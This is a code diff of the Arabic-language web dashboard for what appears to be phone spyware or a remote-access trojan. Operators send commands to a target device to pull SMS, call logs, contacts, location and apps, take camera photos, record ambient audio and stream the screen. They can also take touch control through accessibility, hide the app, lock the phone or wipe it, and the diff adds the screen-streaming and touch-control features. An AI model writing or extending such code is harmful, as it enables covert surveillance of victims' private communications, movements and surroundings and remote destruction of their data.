-        <div class="timestamp">${r.captured_at ? new Date(r.captured_at).toLocaleString('ar-SA') : ''}</div>
-        ${r.duration_seconds ? `<div style="font-size:12px;color:#94a3b8">المدة: ${r.duration_seconds}ث</div>` : ''}
-      </div>`;
-    }).join('')}
-    </div></div>`;
+    <div class="media-grid">${data.map(r => {
+      const isImg = r.mime_type?.startsWith('image/'), isVid = r.mime_type?.startsWith('video/'), isAud = r.mime_type?.startsWith('audio/');
+      return `<div class="media-item">${isImg ? `<img src="${r.file_url}" loading="lazy">` : ''}${isVid ? `<video controls><source src="${r.file_url}"></video>` : ''}${isAud ? `<audio controls style="width:100%"><source src="${r.file_url}"></audio>` : ''}
+        <div class="m-info"><div>${r.media_type||'—'} · ${fmt(r.file_size_bytes)}</div><div style="font-size:10px;color:#475569;margin-top:2px">${DT(r.captured_at)}</div></div></div>`;
+    }).join('')}</div></div>`;
 }
 
+// ================== DEVICE STATE ==================
 async function renderDeviceState(el) {
-  const { data } = await sb.from('device_state_snapshots').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(50);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في بيانات حالة</p></div>'; return; }
+  const { data } = await sb.from('device_state_snapshots').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(100);
+  if (!data || !data.length) { el.innerHTML = '<div class="card" style="text-align:center;padding:40px;color:#64748b">لا توجد بيانات حالة</div>'; return; }
   const last = data[0];
-  el.innerHTML = `
-    <div class="grid-4">
-      <div class="card"><div class="card-header"><h3>البطارية</h3></div>
-        <div class="card-value">${last.battery_level || 0}%</div>
-        <div class="card-sub">${last.is_charging ? 'يشحن' : 'يفرغ'}</div>
-      </div>
-      <div class="card"><div class="card-header"><h3>الشبكة</h3></div>
-        <div class="card-value" style="font-size:18px">${last.network_type || '—'}</div>
-      </div>
-      <div class="card"><div class="card-header"><h3>التخزين</h3></div>
-        <div class="card-value" style="font-size:16px">${formatBytes(last.storage_available)}</div>
-        <div class="card-sub">من ${formatBytes(last.storage_total)}</div>
-      </div>
-    </div>
-    <div class="card"><div class="card-header"><h3>سجل الحالة</h3></div>
-      <table class="data-table">
-        <tr><th>التاريخ</th><th>البطارية</th><th>الشبكة</th><th>يشحن</th></tr>
-        ${data.slice(0, 20).map(r => `<tr>
-          <td class="timestamp">${r.captured_at ? new Date(r.captured_at).toLocaleString('ar-SA') : '—'}</td>
-          <td>${r.battery_level || 0}%</td>
-          <td>${r.network_type || '—'}</td>
-          <td>${r.is_charging ? 'نعم' : 'لا'}</td>
-        </tr>`).join('')}
-      </table>
-    </div>`;
+  el.innerHTML = `<div class="grid-4">
+    <div class="stat-card"><div class="s-icon">🔋</div><div class="s-label">البطارية</div><div class="s-value">${last.battery_level||0}%</div><div class="s-sub">${last.is_charging ? 'يشحن' : 'بطارية'}</div>
+      <div class="battery-bar"><div class="battery-fill" style="width:${last.battery_level||0}%;background:${(last.battery_level||0) > 20 ? (last.is_charging ? '#22c55e' : '#3b82f6') : '#ef4444'}"></div></div></div>
+    <div class="stat-card"><div class="s-icon">📡</div><div class="s-label">الشبكة</div><div class="s-value" style="font-size:18px">${last.network_type||'—'}</div></div>
+    <div class="stat-card"><div class="s-icon">💾</div><div class="s-label">التخزين</div><div class="s-value" style="font-size:16px">${fmt(last.storage_available)}</div><div class="s-sub">من ${fmt(last.storage_total)}</div></div>
+    <div class="stat-card"><div class="s-icon">📱</div><div class="s-label">الشاشة</div><div class="s-value" style="font-size:16px">${last.screen_on ? 'مضاءة' : 'مقفلة'}</div></div>
+  </div>
+  <div class="card"><div class="card-header"><h3>سجل الحالة</h3></div>
+    <table class="data-table"><tr><th>التاريخ</th><th>البطارية</th><th>الشبكة</th><th>الشحن</th><th>الشاشة</th></tr>
+    ${data.map(r => `<tr><td class="timestamp">${DT(r.captured_at)}</td>
+      <td><span style="color:${r.battery_level > 20 ? '#22c55e' : '#ef4444'}">${r.battery_level||0}%</span></td>
+      <td>${r.network_type||'—'}</td><td>${r.is_charging ? 'نعم' : 'لا'}</td><td>${r.screen_on ? 'مضاءة' : 'مقفلة'}</td></tr>`).join('')}
+    </table></div>`;
 }
 
+// ================== COMMANDS ==================
 async function renderCommands(el) {
-  el.innerHTML = `
-    <div class="card"><div class="card-header"><h3>🎮 تحكم كامل بالجهاز</h3></div>
-    <p style="font-size:13px;color:#94a3b8;margin-bottom:12px">لوحة التحكم عن بعد — جميع الأوامر تنفذ فوراً على الجهاز وترفع البيانات مباشرة</p>
-
-    <div style="margin-bottom:16px"><strong style="color:#3b82f6">📡 بيانات وجمع</strong></div>
-    <div class="cmd-grid">
-      <button class="cmd-btn" onclick="sendCommand('sync_now')">🔄 مزامنة فورية</button>
-      <button class="cmd-btn" onclick="sendCommand('capture_location')">📍 التقاط موقع</button>
-      <button class="cmd-btn" onclick="sendCommand('capture_call_logs')">📞 سجل المكالمات</button>
-      <button class="cmd-btn" onclick="sendCommand('capture_sms')">💬 الرسائل SMS</button>
-      <button class="cmd-btn" onclick="sendCommand('capture_contacts')">👤 جهات الاتصال</button>
-      <button class="cmd-btn" onclick="sendCommand('capture_apps')">📱 التطبيقات</button>
-      <button class="cmd-btn" onclick="sendAllCaptureCommands()" style="background:#3b82f6;color:white;font-weight:600">⚡ جمع ورفع كل البيانات فوراً</button>
+  el.innerHTML = `<div class="card"><div class="card-header"><h3>تحكم كامل بالجهاز</h3></div>
+    <div style="font-size:13px;color:#64748b;margin-bottom:14px">لوحة التحكم عن بعد</div>
+    <div class="section-title">بيانات وجمع</div><div class="cmd-grid">
+      <button class="cmd-btn" onclick="sendCommand('sync_now')">مزامنة فورية</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_location')">التقاط موقع</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_call_logs')">سجل المكالمات</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_sms')">الرسائل</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_contacts')">جهات الاتصال</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_apps')">التطبيقات</button>
+      <button class="cmd-btn" onclick="sendAllCaptureCommands()" style="background:linear-gradient(135deg,#3b82f6,#2563eb);color:#fff;font-weight:600">جمع ورفع كل البيانات فوراً</button>
     </div>
-
-    <div style="margin:16px 0"><strong style="color:#f59e0b">📷 وسائط</strong></div>
-    <div class="cmd-grid">
-      <button class="cmd-btn" onclick="sendCommand('capture_camera', {camera:'rear'})">📸 تصوير كاميرا خلفية</button>
-      <button class="cmd-btn" onclick="sendCommand('capture_camera', {camera:'front'})">🤳 تصوير كاميرا أمامية</button>
-      <button class="cmd-btn" onclick="sendCommand('record_ambient', {duration:30})">🎤 تسجيل صوت (30ث)</button>
-      <button class="cmd-btn" onclick="sendCommand('record_ambient', {duration:60})">🎤 تسجيل صوت (60ث)</button>
+    <div class="section-title" style="margin-top:14px">وسائط</div><div class="cmd-grid">
+      <button class="cmd-btn" onclick="sendCommand('capture_camera', {camera:'rear'})">كاميرا خلفية</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_camera', {camera:'front'})">كاميرا أمامية</button>
+      <button class="cmd-btn" onclick="sendCommand('record_ambient', {duration:30})">تسجيل (30ث)</button>
+      <button class="cmd-btn" onclick="sendCommand('record_ambient', {duration:60})">تسجيل (60ث)</button>
     </div>
-
-    <div style="margin:16px 0"><strong style="color:#ef4444">🔒 أمان وتحكم</strong></div>
-    <div class="cmd-grid">
-      <button class="cmd-btn" onclick="sendCommand('lock_device')">🔒 قفل الجهاز</button>
-      <button class="cmd-btn" onclick="sendCommand('play_sound')">🔔 تشغيل صوت إنذار</button>
-      <button class="cmd-btn" onclick="sendCommand('send_alert', {title:'تنبيه!', message:'تم اكتشاف نشاط مشبوه على جهازك'})">⚠️ إرسال تنبيه</button>
-      <button class="cmd-btn danger" onclick="confirmWipe()">💀 مسح الجهاز بالكامل</button>
+    <div class="section-title" style="margin-top:14px">أمان وتحكم</div><div class="cmd-grid">
+      <button class="cmd-btn" onclick="sendCommand('lock_device')">قفل</button>
+      <button class="cmd-btn" onclick="sendCommand('play_sound')">إنذار</button>
+      <button class="cmd-btn" onclick="sendCommand('send_alert', {title:'تنبيه!', message:'نشاط مشبوه'})">تنبيه</button>
+      <button class="cmd-btn danger" onclick="confirmWipe()">مسح كامل</button>
     </div>
-
-    <div style="margin:16px 0"><strong style="color:#22c55e">⚙️ إعدادات</strong></div>
-    <div class="cmd-grid">
-      <button class="cmd-btn" onclick="sendCommand('hide_app')">👁️ إخفاء التطبيق</button>
-      <button class="cmd-btn" onclick="sendCommand('unhide_app')">👁️‍🗨️ إظهار التطبيق</button>
-      <button class="cmd-btn" onclick="sendCommand('update_interval', {minutes:1})">⏱ تحديث كل دقيقة</button>
-      <button class="cmd-btn" onclick="sendCommand('update_interval', {minutes:5})">⏱ تحديث كل 5 دقائق</button>
-      <button class="cmd-btn" onclick="sendCommand('restart_service')">🔄 إعادة تشغيل الخدمة</button>
+    <div class="section-title" style="margin-top:14px">شاشة وتحكم</div><div class="cmd-grid">
+      <button class="cmd-btn" onclick="sendCommand('screen_capture')">لقطة شاشة</button>
+      <button class="cmd-btn" onclick="sendCommand('screen_stream_start', {interval:3000})" style="background:#10b981;color:#fff">بث مباشر</button>
+      <button class="cmd-btn" onclick="sendCommand('screen_stream_stop')" style="background:#ef4444;color:#fff">إيقاف البث</button>
+      <button class="cmd-btn" onclick="sendCommand('start_accessibility')">تحكم باللمس</button>
     </div>
-    </div>
+    <div class="section-title" style="margin-top:14px">إعدادات</div><div class="cmd-grid">
+      <button class="cmd-btn" onclick="sendCommand('hide_app')">إخفاء</button>
+      <button class="cmd-btn" onclick="sendCommand('unhide_app')">إظهار</button>
+      <button class="cmd-btn" onclick="sendCommand('update_interval', {minutes:1})">كل دقيقة</button>
+      <button class="cmd-btn" onclick="sendCommand('update_interval', {minutes:5})">كل 5 د</button>
+      <button class="cmd-btn" onclick="sendCommand('restart_service')">إعادة تشغيل</button>
+    </div></div>
     <div id="cmdResult"></div>
-    <div class="card"><div class="card-header"><h3>📋 الأوامر السابقة</h3></div>
+    <div class="card"><div class="card-header"><h3>الأوامر السابقة</h3></div>
     <div id="prevCommands">جاري التحميل...</div></div>`;
   loadPrevCommands();
 }
 
 async function sendCommand(command, params = {}) {
   if (!selectedDevice) { toast('ما في جهاز محدد'); return; }
-  const resultEl = document.getElementById('cmdResult');
-  resultEl.innerHTML = `<div class="cmd-result" style="color:#f59e0b">⏳ جاري إرسال الأمر "${getCmdLabel(command)}"...</div>`;
-
+  const rEl = document.getElementById('cmdResult');
+  rEl.innerHTML = `<div class="cmd-result" style="background:#1e293b;color:#f59e0b">جاري إرسال "${cmdLabels[command] || command}"...</div>`;
   const { data, error } = await sb.from('remote_commands').insert({
-    device_serial: selectedDevice.device_serial,
-    command,
-    parameters: JSON.stringify(params),
-    status: 'pending',
-    sent_at: new Date().toISOString()
+    device_serial: selectedDevice.device_serial, command,
+    parameters: JSON.stringify(params), status: 'pending', sent_at: new Date().toISOString()
   }).select();
-
-  if (error) {
-    resultEl.innerHTML = `<div class="cmd-result" style="color:#ef4444">✕ خطأ: ${error.message}</div>`;
-    return;
-  }
-
+  if (error) { rEl.innerHTML = `<div class="cmd-result" style="background:#1e293b;color:#ef4444">خطأ: ${error.message}</div>`; return; }
   const cmdId = data?.[0]?.id;
-  resultEl.innerHTML = `<div class="cmd-result" style="color:#f59e0b">⏳ تم الإرسال، في انتظار التنفيذ...</div>`;
-
-  // متابعة حالة الأمر لحين التنفيذ
-  let attempts = 0;
-  const maxAttempts = 30;
+  let attempts = 0, maxAttempts = 30;
   const check = setInterval(async () => {
     attempts++;
     const { data: cmd } = await sb.from('remote_commands').select('status,executed_at,result').eq('id', cmdId).single();
     if (cmd?.status === 'executed') {
       clearInterval(check);
-      resultEl.innerHTML = `<div class="cmd-result" style="color:#22c55e">✅ تم تنفيذ "${getCmdLabel(command)}" بنجاح ${cmd.executed_at ? 'الساعة ' + new Date(cmd.executed_at).toLocaleTimeString('ar-SA') : ''}</div>`;
-      loadPrevCommands();
-      // تحديث التبويب الحالي فوراً لرؤية البيانات الجديدة
-      setTimeout(() => renderTab(currentTab), 1500);
+      rEl.innerHTML = `<div class="cmd-result" style="background:#0a2e1a;color:#22c55e">تم تنفيذ "${cmdLabels[command] || command}" بنجاح</div>`;
+      loadPrevCommands(); setTimeout(() => renderTab(currentTab), 2000);
     } else if (cmd?.status === 'failed') {
       clearInterval(check);
-      resultEl.innerHTML = `<div class="cmd-result" style="color:#ef4444">✕ فشل التنفيذ: ${cmd.result || 'خطأ غير معروف'}</div>`;
+      rEl.innerHTML = `<div class="cmd-result" style="background:#2e0a0a;color:#ef4444">فشل: ${cmd.result || 'خطأ'}</div>`;
       loadPrevCommands();
     } else if (attempts >= maxAttempts) {
       clearInterval(check);
-      resultEl.innerHTML = `<div class="cmd-result" style="color:#f59e0b">⚠ انتهت مهلة الانتظار. قد يكون الجهاز غير متصل.</div>`;
+      rEl.innerHTML = `<div class="cmd-result" style="background:#1e293b;color:#f59e0b">الجهاز قد لا يكون متصلاً</div>`;
     }
   }, 2000);
 }
 
 async function sendAllCaptureCommands() {
-  const cmds = ['capture_location', 'capture_call_logs', 'capture_sms', 'capture_contacts', 'capture_apps'];
-  const resultEl = document.getElementById('cmdResult');
-  resultEl.innerHTML = `<div class="cmd-result" style="color:#f59e0b">⏳ جاري جمع ورفع جميع البيانات...</div>`;
+  const cmds = ['capture_location','capture_call_logs','capture_sms','capture_contacts','capture_apps'];
+  const rEl = document.getElementById('cmdResult');
+  rEl.innerHTML = `<div class="cmd-result" style="background:#1e293b;color:#f59e0b">جاري جمع ورفع جميع البيانات...</div>`;
   let sent = 0, failed = 0;
   for (const cmd of cmds) {
     const { error } = await sb.from('remote_commands').insert({
-      device_serial: selectedDevice.device_serial,
-      command: cmd,
+      device_serial: selectedDevice.device_serial, command,
       parameters: '{}', status: 'pending', sent_at: new Date().toISOString()
     });
-    if (error) { failed++; } else { sent++; }
+    if (error) failed++; else sent++;
   }
-  resultEl.innerHTML = `<div class="cmd-result" style="color:${failed > 0 ? '#f59e0b' : '#22c55e'}">✅ تم إرسال ${sent} أوامر ${failed > 0 ? `, فشل ${failed}` : ''}</div>`;
-  loadPrevCommands();
-  setTimeout(() => renderTab(currentTab), 3000);
+  rEl.innerHTML = `<div class="cmd-result" style="background:#0a2e1a;color:${failed > 0 ? '#f59e0b' : '#22c55e'}">تم إرسال ${sent} أوامر${failed > 0 ? `, فشل ${failed}` : ''}</div>`;
+  loadPrevCommands(); setTimeout(() => renderTab(currentTab), 3000);
 }
 
-function getCmdLabel(cmd) {
-  const labels = { sync_now:'مزامنة فورية', capture_location:'التقاط موقع', capture_call_logs:'سجل المكالمات', capture_sms:'الرسائل SMS', capture_contacts:'جهات الاتصال', capture_apps:'التطبيقات', capture_camera:'تصوير كاميرا', record_ambient:'تسجيل صوت (30ث)', lock_device:'قفل الجهاز', hide_app:'إخفاء التطبيق', unhide_app:'إظهار التطبيق', play_sound:'تشغيل صوت', send_alert:'إرسال تنبيه', update_interval:'تحديث كل دقيقة', restart_service:'إعادة تشغيل الخدمة' };
-  return labels[cmd] || cmd;
-}
+const cmdLabels = { sync_now:'مزامنة', capture_location:'موقع', capture_call_logs:'المكالمات', capture_sms:'الرسائل', capture_contacts:'جهات الاتصال', capture_apps:'التطبيقات', capture_camera:'تصوير', record_ambient:'تسجيل', lock_device:'قفل', hide_app:'إخفاء', unhide_app:'إظهار', play_sound:'إنذار', send_alert:'تنبيه', update_interval:'تحديث', restart_service:'إعادة تشغيل', screen_capture:'لقطة شاشة', screen_stream_start:'بث مباشر', screen_stream_stop:'إيقاف بث', key_press:'ضغطة زر', open_app:'فتح تطبيق', start_accessibility:'تحكم باللمس' };
 
-function confirmWipe() {
-  if (confirm('تحذير: هذا الأمر سيمسح الجهاز بالكامل ولا يمكن التراجع! هل أنت متأكد؟')) {
-    if (confirm('تأكيد نهائي: أنت متأكد من مسح الجهاز؟')) {
-      sendCommand('wipe_device');
-    }
-  }
-}
+function confirmWipe() { if (confirm('تحذير: هذا الأمر سيمسح الجهاز بالكامل!')) { if (confirm('تأكيد نهائي: أنت متأكد؟')) sendCommand('wipe_device'); } }
 
 async function loadPrevCommands() {
   if (!selectedDevice) return;
   const { data } = await sb.from('remote_commands').select('*').eq('device_serial', selectedDevice.device_serial).order('sent_at', { ascending: false }).limit(20);
   const el = document.getElementById('prevCommands');
   if (!el) return;
-  if (!data || data.length === 0) { el.innerHTML = '<p style="color:#64748b;font-size:13px">ما في أوامر سابقة</p>'; return; }
-  el.innerHTML = `<table class="data-table">
-    <tr><th>التاريخ</th><th>الأمر</th><th>الحالة</th><th>النتيجة</th></tr>
-    ${data.map(r => `<tr>
-      <td class="timestamp">${r.sent_at ? new Date(r.sent_at).toLocaleString('ar-SA') : '—'}</td>
-      <td style="font-family:monospace;font-size:12px">${r.command}</td>
-      <td style="color:${r.status === 'executed' ? '#22c55e' : r.status === 'failed' ? '#ef4444' : '#f59e0b'}">${r.status}</td>
-      <td style="font-size:12px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r.result || '—'}</td>
-    </tr>`).join('')}
-  </table>`;
+  if (!data || !data.length) { el.innerHTML = '<div style="color:#64748b;font-size:13px">ما في أوامر سابقة</div>'; return; }
+  el.innerHTML = `<table class="data-table"><tr><th>التاريخ</th><th>الأمر</th><th>الحالة</th><th>النتيجة</th></tr>
+    ${data.map(r => `<tr><td class="timestamp">${r.sent_at ? DT(r.sent_at) : '—'}</td>
+      <td style="font-family:monospace;font-size:11px">${r.command}</td>
+      <td><span style="color:${r.status === 'executed' ? '#22c55e' : r.status === 'failed' ? '#ef4444' : '#f59e0b'}">${r.status}</span></td>
+      <td style="font-size:11px;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r.result||'—'}</td></tr>`).join('')}
+    </table>`;
 }
 
-function formatBytes(bytes) {
-  if (!bytes || bytes === 0) return '0 B';
-  const k = 1024, sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
-  const i = Math.floor(Math.log(bytes) / Math.log(k));
-  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
-}
+function ctNum(v) { return typeof v === 'number' ? v : (v === 'incoming' ? 1 : v === 'outgoing' ? 2 : v === 'missed' ? 3 : v === 'voicemail' ? 4 : v === 'rejected' ? 5 : v === 'blocked' ? 6 : nt(v)); }
+function ctLabel(v) { const n = ctNum(v); return ['','وارد','صادر','فائت','بريد صوتي','مرفوض','محظور'][n] || '—'; }
+function mtNum(v) { return typeof v === 'number' ? v : (v === 'inbox' ? 1 : v === 'sent' ? 2 : v === 'draft' ? 3 : v === 'outbox' ? 4 : nt(v)); }
+function mtLabel(v) { const n = mtNum(v); return ['','وارد','مرسل','مسودة','صادر'][n] || '—'; }
+function fmt(b) { if (!b || b === 0) return '0 B'; const k=1024,s=['B','KB','MB','GB','TB']; const i=Math.floor(Math.log(b)/Math.log(k)); return (b/Math.pow(k,i)).toFixed(1)+' '+s[i]; }
+function toast(msg) { const t = document.createElement('div'); t.className='toast'; t.textContent=msg; document.body.appendChild(t); setTimeout(() => t.remove(), 3000); }
 
-function toast(msg) {
-  const t = document.createElement('div');
-  t.className = 'toast';
-  t.textContent = msg;
-  document.body.appendChild(t);
-  setTimeout(() => t.remove(), 3000);
-}
-
-// Auto-refresh كل 15 ثانية
-setInterval(() => {
-  if (currentUser) {
-    refreshDevices();
-    if (selectedDevice && document.getElementById('tabContent')) {
-      renderTab(currentTab);
-    }
-  }
-}, 15000);
-
-// تحديث حالة الأوامر كل 5 ثواني
-setInterval(() => {
-  if (currentUser && selectedDevice && currentTab === 'commands') {
-    loadPrevCommands();
-  }
-}, 5000);
-
+setInterval(() => { if (currentUser && selectedDevice) refreshCurrentTab(); }, 15000);
 init();
 </script>
 </body>
